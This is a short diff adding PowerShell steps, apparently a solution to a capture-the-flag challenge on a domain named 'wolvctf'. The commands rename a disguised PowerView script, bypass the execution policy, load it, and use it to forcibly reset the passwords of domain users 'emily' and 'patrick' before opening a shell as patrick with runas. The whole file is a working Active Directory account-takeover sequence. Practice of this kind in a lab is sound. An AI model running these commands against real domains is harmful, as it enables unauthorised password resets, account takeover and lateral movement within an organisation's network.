@@ -1,0 +1,10 @@
+cd C:\Users\Public\Documents
+mv .\PowerView.txt .\PowerView.ps1
+powershell -ep bypass
+Import-Module .\PowerView.ps1
+Find-DomainProcess
+$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force`
+Set-DomainUserPassword -Identity 'emily' -AccountPassword $NewPassword
+$NewPassword = ConvertTo-SecureString 'd0nt_us3_4ll3xtendedr1ghts}' -AsPlainText -Force`
+Set-DomainUserPassword -Identity 'patrick' -AccountPassword $NewPassword
+runas /User:wolvctf\patrick cmd
